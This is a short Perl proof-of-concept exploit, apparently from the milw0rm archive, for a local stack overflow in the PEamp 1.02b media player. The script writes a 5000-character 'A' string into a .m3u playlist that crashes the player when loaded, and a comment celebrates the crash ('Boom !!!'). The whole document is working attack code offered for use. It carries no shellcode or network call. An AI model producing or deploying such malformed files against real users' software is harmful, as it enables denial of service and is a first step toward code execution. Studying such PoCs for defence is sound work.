# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### ## ## ## ## ### ## ##
# #   PEamp 1.02b  (.M3U File) Local Stack Overflow POC                        ##
# #  Download: http://files.brothersoft.com/mp3_audio/players/mp3player.zip    ##
# ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ## ### ## ## ## ## ### ## ##
my $chars= "A" x 5000;
my $file="dz.m3u";
open(my $FILE, ">>$file") or die "Cannot open $file: $!";
print $FILE $chars;
close($FILE);
print "$file has been created \n";
# usage: amp.exe=> load playlist => dz.m3u => Boom !!! :)

# milw0rm.com [2009-07-01]